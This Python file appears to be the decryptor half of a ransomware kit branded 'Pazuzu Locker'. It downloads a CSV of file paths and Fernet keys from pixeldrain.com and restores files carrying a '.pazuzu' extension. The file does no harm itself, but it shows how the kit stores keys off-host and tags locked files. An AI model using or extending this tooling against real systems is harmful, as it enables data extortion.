import os
import csv
import base64
import requests
from conf import param
from cryptography.fernet import Fernet


def banner():
    print("")
    print("\033[95m"+r"              ████████████████"+"\033[0m                                                               ")
    print("\033[95m"+r"        ████████      █████       ██"+"\033[0m                                                         ")
    print("\033[95m"+r"     █████          ████        ███"+"\033[0m                                                          ")
    print("\033[95m"+r"   ███            ███          █████"+"\033[0m                                                         ")
    print("\033[95m"+r" ███           █████          ████████"+"\033[0m                                                       ")
    print("\033[95m"+r"██            ██████          ██    ███"+"\033[0m                                                      ")
    print("\033[95m"+r"            ████  ████        ███    ██"+"\033[0m                                                      ")
    print("\033[95m"+r"           ███      █████           ███"+"\033[0m                                                      ")
    print("\033[95m"+r"          ███     ████████████████████"+"\033[0m                                                       ")
    print("\033[95m"+r"         ███      ███     █████████"+"\033[0m                                                          ")
    print("\033[95m"+r"         ██     ███     █████"+"\033[0m"+"\033[97m"+r"            ;-. "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"   ,   "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r" ,  "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"     ")
    print("\033[95m"+r"        ███    ██      ███"+"\033[0m"+"\033[97m"+r"               |  )"+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"   |   "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r" |  "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"     ")
    print("\033[95m"+r"        ██     █      ███"+"\033[0m"+"\033[97m"+r"                |-' "+"\033[0m"+"\033[95m"+r" ,-:"+"\033[0m"+"\033[97m"+r" ,-,"+"\033[0m"+"\033[95m"+r" . ."+"\033[0m"+"\033[97m"+r" ,-,"+"\033[0m"+"\033[95m"+r" . ."+"\033[0m"+"\033[97m"+r"   |   "+"\033[0m"+"\033[95m"+r" ,-."+"\033[0m"+"\033[97m"+r" ,-."+"\033[0m"+"\033[95m"+r" | ,"+"\033[0m"+"\033[97m"+r" ,-."+"\033[0m"+"\033[95m"+r" ;-. ")
    print("\033[95m"+r"        ██      █     ██"+"\033[0m"+"\033[97m"+r"                 |   "+"\033[0m"+"\033[95m"+r" | |"+"\033[0m"+"\033[97m"+r"  / "+"\033[0m"+"\033[95m"+r" | |"+"\033[0m"+"\033[97m"+r"  / "+"\033[0m"+"\033[95m"+r" | |"+"\033[0m"+"\033[97m"+r"   |   "+"\033[0m"+"\033[95m"+r" | |"+"\033[0m"+"\033[97m"+r" |  "+"\033[0m"+"\033[95m"+r" |< "+"\033[0m"+"\033[97m"+r" |-'"+"\033[0m"+"\033[95m"+r" |   ")
    print("\033[95m"+r"         █            ██"+"\033[0m"+"\033[97m"+r"                 '   "+"\033[0m"+"\033[95m"+r" `-`"+"\033[0m"+"\033[97m"+r" '-'"+"\033[0m"+"\033[95m"+r" `-`"+"\033[0m"+"\033[97m"+r" '-'"+"\033[0m"+"\033[95m"+r" `-`"+"\033[0m"+"\033[97m"+r"   `--'"+"\033[0m"+"\033[95m"+r" `-'"+"\033[0m"+"\033[97m"+r" `-'"+"\033[0m"+"\033[95m"+r" ' `"+"\033[0m"+"\033[97m"+r" `-'"+"\033[0m"+"\033[95m"+r" '   ")
    print("\033[95m"+r"                      ██"+"\033[0m                                                                     ")
    print("\033[95m"+r"                      ███"+"\033[0m"+"\033[97m"+r"                                𝔫𝔬𝔱 𝔣𝔬𝔯 𝔦𝔩𝔩𝔢𝔤𝔞𝔩 𝔭𝔲𝔯𝔭𝔬𝔰𝔢                 ")
    print("\033[95m"+r"                       ███"+"\033[0m"+"\033[95m"+r"                             𝔥𝔱𝔱𝔭𝔰://𝔤𝔦𝔱𝔥𝔲𝔟.𝔠𝔬𝔪/𝔫𝔞𝔱𝔢𝔨𝔞𝔩𝔦               ")
    print("\033[95m"+r"                        ███"+"\033[0m                                                                  ")
    print("\033[95m"+r"                          ███"+"\033[0m                                                                ")
    print("\033[95m"+r"                            ███"+"\033[0m                                                              ")
    print("")


def check_conf():
    if param['pxfile_id'] == 'CHANGE_HERE':
        return False
    else:
        return True


def decryptor(data, key):
    cipher = Fernet(key)
    decrypted_data = cipher.decrypt(data)
    return decrypted_data


def csv_data(px_id):
    url = f"https://pixeldrain.com/api/file/{px_id}"
    response = requests.get(url)
    if response.status_code == 200:
        return response.content.decode('utf-8')
    else:
        exit("[x] Wrong pxfile ID provided")


def parser(csv_file):
    csv_r = csv.reader(csv_file.splitlines())
    for row in csv_r:
        if len(row) == 2:
            filepath, key_b64 = row
            key = base64.b64decode(key_b64)
            try:
                with open(filepath, "rb") as encrypted_file:
                    encrypted_data = encrypted_file.read()
                decrypted_data = decryptor(encrypted_data, key)
                new_filepath = filepath.replace('.pazuzu', '')
                with open(new_filepath, "wb") as decrypted_file:
                    decrypted_file.write(decrypted_data)
                os.remove(filepath)
            except PermissionError:
                continue
            except Exception:
                continue
        else:
            exit("[x] Invalid CSV file")


def main():
    try:
        pxfile_id = param['pxfile_id']
        conf = check_conf()
        if conf is False:
            exit("[x] Please change conf.py required values")
        csv_content = csv_data(pxfile_id)
        parser(csv_content)
    except Exception as e:
        print(f"[x] Error: {e}")


if __name__ == '__main__':
    try:
        banner()
        main()
    except KeyboardInterrupt:
        exit("[x] Pazuzu stopped.")
